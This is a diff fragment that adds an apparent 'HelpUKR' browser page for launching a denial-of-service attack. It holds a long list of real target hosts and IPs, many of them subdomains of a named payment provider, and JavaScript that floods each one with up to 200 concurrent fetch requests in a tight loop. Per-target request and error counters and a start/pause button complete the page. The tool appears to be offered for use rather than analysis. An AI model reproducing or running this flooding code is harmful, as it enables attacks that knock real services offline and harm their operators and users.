+		    'https://31.184.251.108',
+		    'https://78.155.216.189',
+		    'https://31.184.251.109',
+		    'https://91.142.84.197',
+		    'https://5.188.162.34',
+		    'https://91.142.84.200',
+		    'https://5.188.162.39',
+		    'https://92.53.76.114',
+		    'https://5.188.162.40',
+		    'https://91.142.92.76',
+		    'https://37.140.199.84',
+		    'https://95.213.222.184',
+		    'https://91.142.92.86',
+		    'https://91.142.92.82',
+		    'https://91.142.84.222',
+		    'https://185.20.226.199',
+		    'https://91.142.92.81',
+		    'https://92.53.76.115',
+		    'https://194.58.118.207',
+		    'https://31.184.251.98',
+		    'https://194.58.97.222',
+		    'https://92.53.83.6',
+		    'https://91.142.84.198',
+		    'https://78.155.216.141',
+		    'https://194.58.61.66',
+		    'https://62.76.184.125',
+		    'https://194.58.121.37',
+		    'https://185.178.45.192',
+		    'https://91.142.92.77',
+		    'https://5.63.157.34',
+		    'https://91.142.84.206',
+		    'https://31.184.251.109',
+		    'https://78.155.216.138',
+		    'https://31.184.251.109',
+		    'https://91.142.92.78',
+		    'https://91.142.84.226',
+        //best2pay.net Targets
+		    'http://best2pay.net',
+		    'http://dev2.best2pay.net',
+		    'http://dev3.best2pay.net',
+		    'http://dev4.best2pay.net',
+		    'http://bold.best2pay.net',
+		    'http://cloud.best2pay.net',
+		    'http://backoffice.best2pay.net',
+		    'http://helpline.best2pay.net',
+		    'http://site.best2pay.net',
+		    'http://landing.best2pay.net',
+		    'http://hci.best2pay.net',
+		    'http://mail.best2pay.net',
+		    'http://crm.best2pay.net',
+		    'http://svn.best2pay.net',
+		    'http://bo.best2pay.net',
+		    'http://dev.best2pay.net',
+		    'http://www.best2pay.net',
+		    'http://pay.best2pay.net',
+		    'http://gpay.best2pay.net',
+		    'http://91.142.91.134',
+		    'http://178.250.152.54',
+		    'http://178.250.152.55',
+		    'http://178.250.152.114',
+		    'http://148.251.154.93',
+		    'http://185.147.82.207',
+		    'http://148.251.154.9',
+		    'http://185.147.82.207',
+		    'http://148.251.154.92',
+		    'http://178.249.68.19',
+		    'http://91.142.90.106',
+		    'http://91.142.91.131',
+		    'http://185.53.22.120',
+		    'http://148.251.154.83',
+		    'http://178.249.68.19',
+		    'http://185.53.22.110',
+		    'http://178.250.152.53',
+		    'http://185.53.22.33',
+		    'http://91.142.91.130',
+		    'http://148.251.154.92',
+		    'https://best2pay.net',
+		    'https://dev2.best2pay.net',
+		    'https://dev3.best2pay.net',
+		    'https://dev4.best2pay.net',
+		    'https://bold.best2pay.net',
+		    'https://cloud.best2pay.net',
+		    'https://backoffice.best2pay.net',
+		    'https://helpline.best2pay.net',
+		    'https://site.best2pay.net',
+		    'https://landing.best2pay.net',
+		    'https://hci.best2pay.net',
+		    'https://mail.best2pay.net',
+		    'https://crm.best2pay.net',
+		    'https://svn.best2pay.net',
+		    'https://bo.best2pay.net',
+		    'https://dev.best2pay.net',
+		    'https://www.best2pay.net',
+		    'https://pay.best2pay.net',
+		    'https://gpay.best2pay.net',
+		    'https://91.142.91.134',
+		    'https://178.250.152.54',
+		    'https://178.250.152.55',
+		    'https://178.250.152.114',
+		    'https://148.251.154.93',
+		    'https://185.147.82.207',
+		    'https://148.251.154.9',
+		    'https://185.147.82.207',
+		    'https://148.251.154.92',
+		    'https://178.249.68.19',
+		    'https://91.142.90.106',
+		    'https://91.142.91.131',
+		    'https://185.53.22.120',
+		    'https://148.251.154.83',
+		    'https://178.249.68.19',
+		    'https://185.53.22.110',
+		    'https://178.250.152.53',
+		    'https://185.53.22.33',
+		    'https://91.142.91.130',
+		    'https://148.251.154.92',
+        ];
+        // initialize variables
+        var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
+        var statRow = document.querySelector("#stats > .row");
+        var myModal = new bootstrap.Modal(document.getElementById('HelpUKR-WarningBox'), {});
+        var CONCURRENCY_LIMIT = 200;
+        var queue = [];
+        var attack = false;
+        var totalrequests = 0;
+        var totalerrors = 0;
+        function togglePause () {
+            if (attack) {
+                attack = false;
+                document.querySelector("div.desc .btn").innerText = "Resume";
+            } else {
+                attack = true;
+                document.querySelector("div.desc .btn").innerText = "Pause";
+                for (var i=0; i<urls.length; i++) {
+                    flood(i);
+                }
+            }
+        }
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                signal: controller.signal,
+                mode: 'no-cors'
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                clearTimeout(id);
+                throw error;
+            });
+        }
+        async function sleep(ms) {
+            return new Promise(r => setTimeout(r, ms));
+        }         
+        async function flood(n) {
+            const url = urls[n];
+            const target = targets[url];
+            while (attack) {
+                if (queue.length > CONCURRENCY_LIMIT) {
+                    await queue.shift();
+                }
+                queue.push(
+                    fetchWithTimeout(url, { timeout: 2000 })
+                        .catch((error) => {
+                            if (error.code === 20 /* ABORT */) {
+                                return;
+                            }
+                            target.number_of_errored_responses++;
+                            target.error_message = error.message;
+                            totalerrors++;
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+                                target.number_of_errored_responses++;
+                                target.error_message = response.statusText;
+                                totalerrors++;
+                            }
+                            target.number_of_requests++;
+                        })
+                        .finally(() => updateTargetDisplay(n))
+                );
+                await sleep(1);
+            }
+        }
+        // Update data for target n
+        function updateTargetDisplay(n) {
+            var url = urls[n];
+            var {number_of_requests, number_of_errored_responses} = targets[url];
+            var requests_cell = document.querySelector(`#target${n} .requests`);
+            var errors_cell = document.querySelector(`#target${n} .errors`);
+            requests_cell.innerText = number_of_requests;
+            errors_cell.innerText = number_of_errored_responses;
+            document.querySelector("#totalrequests").innerText = totalrequests;
+            document.querySelector("#totalerrors").innerText = totalerrors;
+        }
+        // Shuffle array order before starting
+        for (let i = urls.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [urls[i], urls[j]] = [urls[j], urls[i]];
+        }
+        // Create div for each target
+        for (var i=0; i<urls.length; i++) {
+            statRow.innerHTML += `
+                <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
+                  <h7>${"<u><i>Hidden Target:</i></u>"}</h7>
+                    <table class='status'>
+                      <tr><td>requests:</td><td class="requests">0</td></tr>
+                      </tr><td>errors:</td><td class="errors">0</td></tr>
+                    </table>
+                  </div>
+            `;
+        }
+        // Show warning window
+        myModal.toggle();
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-85513613-1');
+</script>
+<script>
+// BETA plugin for estimated requested data
+(function($) {
+  $.fn.countTo = function(options) {
+    return this.each(function() {
+      //-- Arrange
+      var FRAME_RATE = 60; // Predefine default frame rate to be 60fps
+      var $el = $(this);
+      var countFrom = parseInt($el.attr('data-count-from'));
+      var countTo = parseInt($el.attr('data-count-to'));
+      var countSpeed = $el.attr('data-count-speed'); // Number increment per second
+
+      //-- Action
+      var rafId;
+      var increment;
+      var currentCount = countFrom;
+      var countAction = function() {              // Self looping local function via requestAnimationFrame
+        if(currentCount < countTo) {              // Perform number incremeant
+          $el.text(Math.floor(currentCount));     // Update HTML display
+          increment = countSpeed / FRAME_RATE;    // Calculate increment step
+          currentCount += increment;              // Increment counter
+          rafId = requestAnimationFrame(countAction);
+        } else {                                  // Terminate animation once it reaches the target count number
+          $el.text(countTo);                      // Set to the final value before everything stops
+          //cancelAnimationFrame(rafId);
+        }
+      };
+      rafId = requestAnimationFrame(countAction); // Initiates the looping function
+    });
+  };
+}(jQuery));
+
+//-- Executing
+$('.number-counter').countTo();
+</script>
+</html>
